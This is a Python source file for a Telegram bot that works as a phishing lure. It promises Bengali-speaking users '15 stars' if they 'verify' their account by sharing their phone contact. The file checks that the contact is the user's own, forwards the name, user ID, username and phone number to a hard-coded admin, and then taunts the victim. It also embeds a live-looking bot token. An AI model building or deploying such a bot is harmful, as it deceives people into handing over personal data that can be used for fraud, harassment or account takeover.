import telebot
from telebot import types

BOT_TOKEN = "8754061968:AAF5LhWRJoRufBa6VpSXPs87RaqipTOe3lM"
ADMIN_ID = 7079833447

bot = telebot.TeleBot(BOT_TOKEN)


@bot.message_handler(commands=['start'])
def start(message):
    keyboard = types.ReplyKeyboardMarkup(
        resize_keyboard=True,
        one_time_keyboard=True
    )

    share_contact = types.KeyboardButton(
        "VERIFY ACCOUNT BY PHONE NUMBER",
        request_contact=True
    )

    keyboard.add(share_contact)

    bot.send_message(
        message.chat.id,
        "১৫ স্টার রিডিম করতে আপনার অ্যাকাউন্ট ভেরিফাই করুন 💝",
        reply_markup=keyboard
    )


@bot.message_handler(content_types=['contact'])
def receive_contact(message):

    contact = message.contact

    # নিজের Telegram account-এর contact কিনা যাচাই
    if contact.user_id != message.from_user.id:
        bot.send_message(
            message.chat.id,
            "❌ অন্য কারো contact দেওয়া হয়েছে।\nনিজের Telegram contact share করুন।"
        )
        return

    phone = contact.phone_number
    user_id = message.from_user.id
    username = message.from_user.username

    admin_text = (
        "📱 NEW CONTACT RECEIVED\n\n"
        f"👤 Name: {message.from_user.first_name}\n"
        f"🆔 User ID: {user_id}\n"
        f"👤 Username: @{username if username else 'N/A'}\n"
        f"📞 Phone: +{phone.lstrip('+')}\n\n"
        "✅ Contact matched with Telegram User ID"
    )

    bot.send_message(ADMIN_ID, admin_text)

    bot.send_message(
        message.chat.id,
        "I GOT YOUR NUMBER☠️\n\n"
        "STUPID HUMAN",
        reply_markup=types.ReplyKeyboardRemove()
    )


bot.infinity_polling()